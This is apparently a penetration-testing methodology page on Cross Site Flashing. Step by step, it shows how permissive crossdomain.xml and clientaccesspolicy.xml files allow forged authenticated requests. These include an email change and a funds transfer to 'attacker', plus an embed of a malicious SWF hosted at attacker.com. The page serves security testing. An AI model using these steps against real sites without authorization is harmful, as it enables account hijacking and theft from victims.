# Cross Site Flashing

## Check List

## Methodology

### Black Box

#### CSRF via Flash (`crossdomain.xml` Misconfiguration)

{% stepper %}
{% step %}
Identify presence of Flash object on the application
{% endstep %}

{% step %}
Browse application and locate embedded `SWF` file

```http
GET /static/upload.swf HTTP/1.1
Host: target.com
```
{% endstep %}

{% step %}
Check for Flash cross-domain policy file

```http
GET /crossdomain.xml HTTP/1.1
Host: target.com
```
{% endstep %}

{% step %}
If response contains permissive policy

```xml
<cross-domain-policy>
  <allow-access-from domain="*" />
</cross-domain-policy>
```
{% endstep %}

{% step %}
Then any external domain can interact with the application via Flash, then Login to your account and Intercept a sensitive request (example: change email)

```http
POST /account/change-email HTTP/1.1
Host: target.com
Cookie: session=abc123
Content-Type: application/x-www-form-urlencoded

email=attacker@test.com
```
{% endstep %}

{% step %}
Create a malicious `SWF` file that performs a POST request to the sensitive endpoint using victim’s cookies
{% endstep %}

{% step %}
Host malicious SWF on attacker-controlled domain
{% endstep %}

{% step %}
Embed malicious SWF inside attacker page

```java
<object data="http://attacker.com/malicious.swf"></object>
```
{% endstep %}

{% step %}
Open attacker page while authenticated to target.com, If email is changed without CSRF token validation and Flash request is accepted due to permissive `crossdomain.xml`, Cross Site Flashing vulnerability is confirmed
{% endstep %}
{% endstepper %}

***

#### Socket Policy Misconfiguration

{% stepper %}
{% step %}
Check for socket policy file

```http
GET /clientaccesspolicy.xml HTTP/1.1
Host: target.com
```
{% endstep %}

{% step %}
If response contains wildcard access

```xml
<access-policy>
  <cross-domain-access>
    <policy>
      <allow-from http-request-headers="*" domain="*" />
      <grant-to>
        <resource path="/" include-subpaths="true"/>
      </grant-to>
    </policy>
  </cross-domain-access>
</access-policy>
```
{% endstep %}

{% step %}
Then cross-domain Flash socket access is allowed, Develop proof-of-concept SWF that sends authenticated POST request to

```http
POST /api/transfer HTTP/1.1
Host: target.com
Cookie: session=abc123
Content-Type: application/json

{"amount":1000,"to":"attacker"}
```
{% endstep %}

{% step %}
Host `SWF` externally, Victim visits attacker page while logged in
{% endstep %}

{% step %}
If transaction executes without additional server-side validation, Flash-based request forgery is possible
{% endstep %}

{% step %}
If authenticated state-changing requests can be triggered cross-domain via Flash, Cross Site Flashing vulnerability is confirmed
{% endstep %}
{% endstepper %}

***

### White Box

## Cheat Sheet
